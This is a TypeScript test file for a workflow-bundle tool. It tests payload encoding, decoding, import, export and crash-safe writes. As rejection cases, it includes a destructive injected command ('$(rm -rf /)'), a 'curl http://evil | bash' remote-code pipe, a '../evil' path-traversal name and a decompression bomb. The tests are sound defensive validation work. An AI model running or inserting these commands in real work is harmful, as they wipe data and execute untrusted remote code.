import { afterEach, describe, expect, test } from "bun:test";
import { gzipSync } from "node:zlib";
import { mkdir, mkdtemp, readFile, readdir, rename, rm, stat, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { dirname, join } from "node:path";
import { CAPTURE_BYTE_LIMIT, CaptureLimitError } from "../../src/context";
import {
  checkPayload,
  decodePayload,
  encodePayload,
  exportWorkflowBundle,
  extractPayload,
  formatImportCommand,
  importJournalPath,
  looksLikeWorkflowYaml,
  parseImportScope,
  previewBundle,
  recoverInterruptedImport,
  runImport,
} from "../../src/workflow/exchange";
import { schemaPointer, withPinnedSchemaPointer } from "../../src/workflow/inputs";
import { WorkflowLoadError } from "../../src/workflow/grammar";
import { PRODUCT_VERSION } from "../../src/context";

const dirs: string[] = [];
const prevHome = process.env.HOME;
afterEach(async () => {
  if (prevHome === undefined) delete process.env.HOME;
  else process.env.HOME = prevHome;
  await Promise.all(dirs.splice(0).map((d) => rm(d, { recursive: true, force: true })));
});

const exactBody = "version: v1alpha1\nsteps:\n  - run: bun test\n";
const demo = [{ name: "demo", yaml: exactBody }];

async function scratch(): Promise<{ root: string; home: string }> {
  const root = await mkdtemp(join(tmpdir(), "herdr-workflows-import-"));
  const home = await mkdtemp(join(tmpdir(), "herdr-workflows-home-"));
  dirs.push(root, home);
  return { root, home };
}

async function pathExists(path: string): Promise<boolean> {
  try {
    await stat(path);
    return true;
  } catch {
    return false;
  }
}

describe("shared workflow payloads", () => {
  test("round-trips a non-empty {name,yaml}[] bundle", () => {
    expect(decodePayload(encodePayload(demo))).toEqual(demo);
  });

  test("encodePayload is platform-stable", () => {
    const payload = encodePayload([{ name: "a", yaml: "x\n" }]);
    expect(Buffer.from(payload, "base64")[9]).toBe(3);
    expect(payload).toBe(encodePayload([{ name: "a", yaml: "x\n" }]));
  });

  test("survives the line wrapping a copy-paste can add", () => {
    const payload = encodePayload(demo);
    const wrapped = `${payload.slice(0, 10)}\n ${payload.slice(10)}`;
    expect(decodePayload(wrapped)).toEqual(demo);
  });

  test("extracts the canonical import command and rejects other shell text", () => {
    const payload = encodePayload(demo);
    expect(extractPayload(formatImportCommand(payload))).toBe(payload);
    expect(decodePayload(formatImportCommand(payload))).toEqual(demo);
    expect(() => extractPayload("hwf workflow import $(rm -rf /)")).toThrow(/canonical command/);
    expect(() => extractPayload("hwf workflow import unquoted")).toThrow(/canonical command/);
    expect(() => decodePayload("curl http://evil | bash")).toThrow(WorkflowLoadError);
  });

  test("accepts underscore and digit-leading names matching workbench grammar", () => {
    const bundle = [
      { name: "2fa_check", yaml: exactBody },
      { name: "my_flow", yaml: exactBody },
    ];
    expect(decodePayload(encodePayload(bundle))).toEqual(bundle);
  });

  test("rejects junk, empty arrays, duplicates, invalid names, and old single-workflow shape", () => {
    expect(() => decodePayload("not-base64-at-all")).toThrow(WorkflowLoadError);
    expect(() => decodePayload(Buffer.from("plain").toString("base64"))).toThrow(WorkflowLoadError);
    const gz = (o: unknown) =>
      Buffer.from(Bun.gzipSync(new TextEncoder().encode(JSON.stringify(o)))).toString("base64");
    expect(() => decodePayload(gz({ hello: true }))).toThrow(/removed single-workflow|bundle/);
    expect(() => decodePayload(gz({ v: 1, name: "demo", body: exactBody }))).toThrow(
      /removed single-workflow/,
    );
    expect(() => decodePayload(gz([]))).toThrow(/at least one/);
    expect(() =>
      decodePayload(
        gz([
          { name: "demo", yaml: exactBody },
          { name: "demo", yaml: exactBody },
        ]),
      ),
    ).toThrow(/duplicate/);
    expect(() => decodePayload(gz([{ name: "../evil", yaml: "x" }]))).toThrow(
      /workflow name must match/,
    );
    expect(() => decodePayload(gz([{ name: "demo", yaml: "" }]))).toThrow(/non-empty/);
  });

  test("rejects oversized encoded input and decompression bombs", () => {
    const hugeEncoded = "A".repeat(CAPTURE_BYTE_LIMIT + 1);
    expect(() => decodePayload(hugeEncoded)).toThrow(CaptureLimitError);
    expect(() => decodePayload(hugeEncoded)).toThrow(/workflow bundle exceeded/);

    const bomb = Buffer.alloc(CAPTURE_BYTE_LIMIT + 64, 65);
    const encoded = gzipSync(bomb).toString("base64");
    expect(() => decodePayload(encoded)).toThrow(CaptureLimitError);
    expect(() => decodePayload(encoded)).toThrow(/workflow bundle exceeded/);
  });

  test("encodePayload rejects uncompressed bundles over the capture cap", () => {
    const yaml = "x".repeat(CAPTURE_BYTE_LIMIT);
    expect(() => encodePayload([{ name: "huge", yaml }])).toThrow(CaptureLimitError);
    expect(() => encodePayload([{ name: "huge", yaml }])).toThrow(/workflow bundle exceeded/);
  });

  test("checkPayload accepts raw YAML when a name is supplied", () => {
    expect(looksLikeWorkflowYaml(exactBody)).toBe(true);
    expect(checkPayload(exactBody, { name: "mine" })).toEqual([
      { name: "mine", yaml: exactBody.trim() },
    ]);
    expect(() => checkPayload(exactBody)).toThrow(/requires a workflow name/);
  });

  test("checkPayload accepts raw YAML with an inline steps collection", () => {
    const inline = "version: v1alpha1\nsteps: [{run: [echo, hello]}]\n";
    expect(looksLikeWorkflowYaml(inline)).toBe(true);
    expect(checkPayload(inline, { name: "inline" })).toEqual([
      { name: "inline", yaml: inline.trim() },
    ]);
  });

  test("checkPayload rejects non-v1alpha1 YAML with the ordinary load error", () => {
    expect(() => checkPayload(encodePayload([{ name: "bad", yaml: "nope: 1\n" }]))).toThrow(
      /version is required|steps is required|unsupported workflow format/,
    );
    expect(() =>
      checkPayload(
        encodePayload([
          {
            name: "legacy",
            yaml: "version: experimental\nsteps:\n  - run: x\n",
          },
        ]),
      ),
    ).toThrow(/unsupported workflow format/);
  });

  test("preview shows every YAML body and aggregates warnings", () => {
    const bundle = [
      {
        name: "review",
        yaml: `version: v1alpha1
title: Review
steps:
  - agent: "see {{context.transcript}}"
    using: claude
  - herdr: pane.close
    params: { pane_id: "{{context.pane}}" }
`,
      },
    ];
    const preview = previewBundle(bundle);
    expect(preview.text).toContain("--- review.yaml (Review) ---");
    expect(preview.warnings).toContain("transcript");
    expect(preview.warnings.some((w) => w.includes("pane.close"))).toBe(true);
    expect(preview.text).toContain(bundle[0]!.yaml);
  });

  test("preview flags referenced children missing from the bundle", () => {
    const preview = previewBundle([
      {
        name: "parent",
        yaml: `version: v1alpha1
steps:
  - workflow: missing-child
`,
      },
    ]);
    expect(preview.text).toContain("missing-child");
    expect(preview.text).toContain("not in this bundle");
  });
});

describe("hwf workflow import", () => {
  test("declining the review writes nothing", async () => {
    const { root, home } = await scratch();
    const outcome = await runImport(encodePayload(demo), {
      repoRoot: root,
      home,
      prompts: { confirm: async () => false, chooseScope: async () => "repo" },
    });
    expect(outcome).toEqual({ aborted: true });
    expect(await Bun.file(join(root, ".hwf", "workflows", "demo.yaml")).exists()).toBe(false);
  });

  test("chosen scope decides the directory", async () => {
    const { root, home } = await scratch();
    for (const scope of ["repo", "global"] as const) {
      const outcome = await runImport(encodePayload(demo), { repoRoot: root, home, scope });
      if ("aborted" in outcome) throw new Error("unreachable");
      expect(outcome.result.status).toBe("written");
      if (outcome.result.status !== "written") throw new Error("unreachable");
      expect(outcome.result.results).toEqual([
        {
          name: "demo",
          path: join(scope === "repo" ? root : home, ".hwf", "workflows", "demo.yaml"),
        },
      ]);
    }
  });

  test("written YAML is preserved exactly with no reformatting", async () => {
    const { root, home } = await scratch();
    const odd = "version: v1alpha1\nsteps:\n- run:  [echo,  hi]\n";
    const outcome = await runImport(encodePayload([{ name: "odd", yaml: odd }]), {
      repoRoot: root,
      home,
      scope: "repo",
    });
    if ("aborted" in outcome) throw new Error("unreachable");
    expect(outcome.result.status).toBe("written");
    if (outcome.result.status !== "written") throw new Error("unreachable");
    expect(await readFile(outcome.result.results[0]!.path, "utf8")).toBe(
      withPinnedSchemaPointer(odd),
    );
  });

  test("import re-pins a foreign schema pointer to this build", async () => {
    const { root, home } = await scratch();
    const foreign = `# yaml-language-server: $schema=https://raw.githubusercontent.com/aorumbayev/herdr-workflows/v0.1.0/docs/workflow.schema.json
version: v1alpha1
steps:
  - run: [echo, hi]
`;
    const outcome = await runImport(encodePayload([{ name: "pinned", yaml: foreign }]), {
      repoRoot: root,
      home,
      scope: "repo",
    });
    if ("aborted" in outcome) throw new Error("unreachable");
    expect(outcome.result.status).toBe("written");
    if (outcome.result.status !== "written") throw new Error("unreachable");
    const onDisk = await readFile(outcome.result.results[0]!.path, "utf8");
    expect(onDisk.startsWith(schemaPointer())).toBe(true);
    expect(onDisk).toContain(`v${PRODUCT_VERSION}`);
    expect(onDisk).not.toContain("v0.1.0");
  });

  test("conflicts write nothing until replace-all", async () => {
    const { root, home } = await scratch();
    await mkdir(join(root, ".hwf", "workflows"), { recursive: true });
    await writeFile(
      join(root, ".hwf", "workflows", "demo.yaml"),
      "version: v1alpha1\nsteps:\n  - run: mine\n",
    );
    const kept = await runImport(encodePayload(demo), { repoRoot: root, home, scope: "repo" });
    if ("aborted" in kept) throw new Error("unreachable");
    expect(kept.result.status).toBe("conflicts");
    expect(await readFile(join(root, ".hwf", "workflows", "demo.yaml"), "utf8")).toBe(
      "version: v1alpha1\nsteps:\n  - run: mine\n",
    );

    const forced = await runImport(encodePayload(demo), {
      repoRoot: root,
      home,
      scope: "repo",
      force: true,
    });
    if ("aborted" in forced) throw new Error("unreachable");
    expect(forced.result.status).toBe("written");
    if (forced.result.status !== "written") throw new Error("unreachable");
    expect(await readFile(forced.result.results[0]!.path, "utf8")).toBe(
      withPinnedSchemaPointer(exactBody),
    );
  });

  test("bundle conflict on any name preserves the whole existing set", async () => {
    const { root, home } = await scratch();
    await mkdir(join(root, ".hwf", "workflows"), { recursive: true });
    await writeFile(
      join(root, ".hwf", "workflows", "a.yaml"),
      "version: v1alpha1\nsteps:\n  - run: keep-a\n",
    );
    const bundle = [
      { name: "a", yaml: exactBody },
      { name: "b", yaml: exactBody },
    ];
    const outcome = await runImport(encodePayload(bundle), {
      repoRoot: root,
      home,
      scope: "repo",
    });
    if ("aborted" in outcome) throw new Error("unreachable");
    expect(outcome.result.status).toBe("conflicts");
    expect(await Bun.file(join(root, ".hwf", "workflows", "b.yaml")).exists()).toBe(false);
    expect(await readFile(join(root, ".hwf", "workflows", "a.yaml"), "utf8")).toContain("keep-a");
  });

  test("replace-all writes every staged entry", async () => {
    const { root, home } = await scratch();
    await mkdir(join(root, ".hwf", "workflows"), { recursive: true });
    await writeFile(
      join(root, ".hwf", "workflows", "a.yaml"),
      "version: v1alpha1\nsteps:\n  - run: old\n",
    );
    const bundle = [
      { name: "a", yaml: exactBody },
      { name: "b", yaml: exactBody },
    ];
    const outcome = await runImport(encodePayload(bundle), {
      repoRoot: root,
      home,
      scope: "repo",
      force: true,
    });
    if ("aborted" in outcome) throw new Error("unreachable");
    expect(outcome.result.status).toBe("written");
    expect(await readFile(join(root, ".hwf", "workflows", "a.yaml"), "utf8")).toBe(
      withPinnedSchemaPointer(exactBody),
    );
    expect(await readFile(join(root, ".hwf", "workflows", "b.yaml"), "utf8")).toBe(
      withPinnedSchemaPointer(exactBody),
    );
  });

  test("concurrent non-replace imports do not clobber a racing destination", async () => {
    const { root, home } = await scratch();
    const payload = encodePayload([{ name: "race", yaml: exactBody }]);
    const [one, two] = await Promise.all([
      runImport(payload, { repoRoot: root, home, scope: "repo" }),
      runImport(payload, { repoRoot: root, home, scope: "repo" }),
    ]);
    const outcomes = [one, two];
    expect(outcomes.every((o) => !("aborted" in o))).toBe(true);
    const statuses = outcomes.map((o) => ("aborted" in o ? "aborted" : o.result.status));
    expect(statuses.filter((s) => s === "written")).toHaveLength(1);
    expect(statuses.filter((s) => s === "conflicts")).toHaveLength(1);
    expect(await readFile(join(root, ".hwf", "workflows", "race.yaml"), "utf8")).toBe(
      withPinnedSchemaPointer(exactBody),
    );
  });

  test("staging failure leaves the scope wholly pre-import with no litter", async () => {
    const { root, home } = await scratch();
    const dir = join(root, ".hwf", "workflows");
    await mkdir(dir, { recursive: true });
    const oldA = "version: v1alpha1\nsteps:\n  - run: old-a\n";
    const oldB = "version: v1alpha1\nsteps:\n  - run: old-b\n";
    await writeFile(join(dir, "a.yaml"), oldA);
    await writeFile(join(dir, "b.yaml"), oldB);
    const bundle = [
      { name: "a", yaml: exactBody },
      { name: "b", yaml: exactBody },
    ];
    await expect(
      runImport(encodePayload(bundle), {
        repoRoot: root,
        home,
        scope: "repo",
        force: true,
        afterPublish: async ({ name }) => {
          if (name === "a") throw new Error("injected staging failure");
        },
      }),
    ).rejects.toThrow(/injected staging failure/);
    expect(await readFile(join(dir, "a.yaml"), "utf8")).toBe(oldA);
    expect(await readFile(join(dir, "b.yaml"), "utf8")).toBe(oldB);
    expect(
      (await readdir(dirname(dir))).filter((n) => n.includes("staging") || n.includes("prev")),
    ).toEqual([]);
    expect(await Bun.file(importJournalPath(dir)).exists()).toBe(false);
  });

  test("interrupted mid-swap recovers to a wholly new scope with no litter", async () => {
    const { root, home } = await scratch();
    const dir = join(root, ".hwf", "workflows");
    await mkdir(dir, { recursive: true });
    const oldA = "version: v1alpha1\nsteps:\n  - run: old-a\n";
    const oldB = "version: v1alpha1\nsteps:\n  - run: old-b\n";
    await writeFile(join(dir, "a.yaml"), oldA);
    await writeFile(join(dir, "b.yaml"), oldB);
    await writeFile(join(dir, "keep.yaml"), "version: v1alpha1\nsteps:\n  - run: keep\n");

    const staging = `${dir}.test.staging`;
    const previous = `${dir}.test.prev`;
    await mkdir(staging, { recursive: true });
    await writeFile(join(staging, "a.yaml"), exactBody);
    await writeFile(join(staging, "b.yaml"), exactBody);
    await writeFile(join(staging, "keep.yaml"), "version: v1alpha1\nsteps:\n  - run: keep\n");
    await writeFile(importJournalPath(dir), JSON.stringify({ dest: dir, staging, previous }));
    await rename(dir, previous);

    expect(await Bun.file(join(dir, "a.yaml")).exists()).toBe(false);
    await recoverInterruptedImport(dir);

    expect(await readFile(join(dir, "a.yaml"), "utf8")).toBe(exactBody);
    expect(await readFile(join(dir, "b.yaml"), "utf8")).toBe(exactBody);
    expect(await readFile(join(dir, "keep.yaml"), "utf8")).toContain("run: keep");
    expect(await pathExists(previous)).toBe(false);
    expect(await pathExists(staging)).toBe(false);
    expect(await Bun.file(importJournalPath(dir)).exists()).toBe(false);
    void home;
  });

  test("SIGKILL after first staged entry leaves wholly old or wholly new", async () => {
    const { root, home } = await scratch();
    const dir = join(root, ".hwf", "workflows");
    await mkdir(dir, { recursive: true });
    const oldA = "version: v1alpha1\nsteps:\n  - run: old-a\n";
    const oldB = "version: v1alpha1\nsteps:\n  - run: old-b\n";
    await writeFile(join(dir, "a.yaml"), oldA);
    await writeFile(join(dir, "b.yaml"), oldB);

    const marker = join(root, "staged-a");
    const child = Bun.spawn({
      cmd: [
        process.execPath,
        "-e",
        `
        import { runImport } from ${JSON.stringify(join(import.meta.dir, "../../src/workflow/exchange.ts"))};
        import { encodePayload } from ${JSON.stringify(join(import.meta.dir, "../../src/workflow/exchange.ts"))};
        import { writeFile } from "node:fs/promises";
        const exactBody = ${JSON.stringify(exactBody)};
        await runImport(encodePayload([
          { name: "a", yaml: exactBody },
          { name: "b", yaml: exactBody },
        ]), {
          repoRoot: ${JSON.stringify(root)},
          home: ${JSON.stringify(home)},
          scope: "repo",
          force: true,
          afterPublish: async ({ name }) => {
            if (name === "a") await writeFile(${JSON.stringify(marker)}, "1");
          },
          beforeSwap: async () => {
            for (;;) await Bun.sleep(1000);
          },
        });
        `,
      ],
      stdout: "ignore",
      stderr: "ignore",
    });

    const deadline = Date.now() + 5000;
    while (!(await Bun.file(marker).exists()) && Date.now() < deadline) {
      await Bun.sleep(20);
    }
    expect(await Bun.file(marker).exists()).toBe(true);
    child.kill("SIGKILL");
    await child.exited;

    await recoverInterruptedImport(dir, { force: true });

    const a = await readFile(join(dir, "a.yaml"), "utf8");
    const b = await readFile(join(dir, "b.yaml"), "utf8");
    const whollyOld = a === oldA && b === oldB;
    const pinned = withPinnedSchemaPointer(exactBody);
    const whollyNew = a === pinned && b === pinned;
    expect(whollyOld || whollyNew).toBe(true);
    const parent = await readdir(dirname(dir));
    expect(parent.filter((n) => n.includes(".staging") || n.includes(".prev"))).toEqual([]);
    expect(await Bun.file(importJournalPath(dir)).exists()).toBe(false);
  });

  test("no scope and no prompt is an error, not a silent default", async () => {
    const { root, home } = await scratch();
    await expect(runImport(encodePayload(demo), { repoRoot: root, home })).rejects.toThrow(
      /no destination chosen/,
    );
  });

  test("parseImportScope accepts aliases", () => {
    expect(parseImportScope("R")).toBe("repo");
    expect(parseImportScope("global")).toBe("global");
    expect(parseImportScope("nope")).toBeUndefined();
  });
});

describe("workflow bundle export", () => {
  test("exports exact selected source yaml", async () => {
    const { root, home } = await scratch();
    process.env.HOME = home;
    await mkdir(join(root, ".hwf", "workflows"), { recursive: true });
    const body = "version: v1alpha1\nsteps:\n  - run: handoff\n";
    await writeFile(join(root, ".hwf", "workflows", "handoff.yaml"), body);
    const exported = await exportWorkflowBundle({
      name: "handoff",
      scope: "repo",
      repoRoot: root,
    });
    expect(exported.entries).toEqual([{ name: "handoff", yaml: body }]);
    expect(exported.provenance).toEqual([{ name: "handoff", source: "repo" }]);
    expect(exported.command).toBe(formatImportCommand(exported.payload));
    expect(JSON.stringify(exported.entries[0])).not.toContain('"source"');
  });

  test("includes transitive mixed-source children once with display provenance", async () => {
    const { root, home } = await scratch();
    process.env.HOME = home;
    await mkdir(join(root, ".hwf", "workflows"), { recursive: true });
    await mkdir(join(home, ".hwf", "workflows"), { recursive: true });
    await writeFile(
      join(root, ".hwf", "workflows", "root.yaml"),
      "version: v1alpha1\nsteps:\n  - workflow: mid\n",
    );
    await writeFile(
      join(root, ".hwf", "workflows", "mid.yaml"),
      "version: v1alpha1\nsteps:\n  - workflow: leaf\n",
    );
    await writeFile(
      join(home, ".hwf", "workflows", "leaf.yaml"),
      "version: v1alpha1\nsteps:\n  - run: leaf\n",
    );
    const exported = await exportWorkflowBundle({
      name: "root",
      scope: "repo",
      repoRoot: root,
    });
    expect(exported.entries.map((e) => e.name)).toEqual(["root", "mid", "leaf"]);
    expect(exported.provenance).toEqual([
      { name: "root", source: "repo" },
      { name: "mid", source: "repo" },
      { name: "leaf", source: "global" },
    ]);
    const decoded = decodePayload(exported.payload);
    expect(decoded.every((e) => Object.keys(e).sort().join() === "name,yaml")).toBe(true);
  });

  test("fails on missing children and cycles", async () => {
    const { root, home } = await scratch();
    process.env.HOME = home;
    await mkdir(join(root, ".hwf", "workflows"), { recursive: true });
    await writeFile(
      join(root, ".hwf", "workflows", "broken.yaml"),
      "version: v1alpha1\nsteps:\n  - workflow: nope\n",
    );
    await expect(
      exportWorkflowBundle({ name: "broken", scope: "repo", repoRoot: root }),
    ).rejects.toThrow(/workflow 'nope' not found/);

    await writeFile(
      join(root, ".hwf", "workflows", "a.yaml"),
      "version: v1alpha1\nsteps:\n  - workflow: b\n",
    );
    await writeFile(
      join(root, ".hwf", "workflows", "b.yaml"),
      "version: v1alpha1\nsteps:\n  - workflow: a\n",
    );
    await expect(
      exportWorkflowBundle({ name: "a", scope: "repo", repoRoot: root }),
    ).rejects.toThrow(/workflow cycle: a → b → a/);
  });

  test("fails when the selected source is invalid", async () => {
    const { root, home } = await scratch();
    process.env.HOME = home;
    await mkdir(join(root, ".hwf", "workflows"), { recursive: true });
    await writeFile(join(root, ".hwf", "workflows", "bad.yaml"), "nope: 1\n");
    await expect(
      exportWorkflowBundle({ name: "bad", scope: "repo", repoRoot: root }),
    ).rejects.toThrow();
  });
});
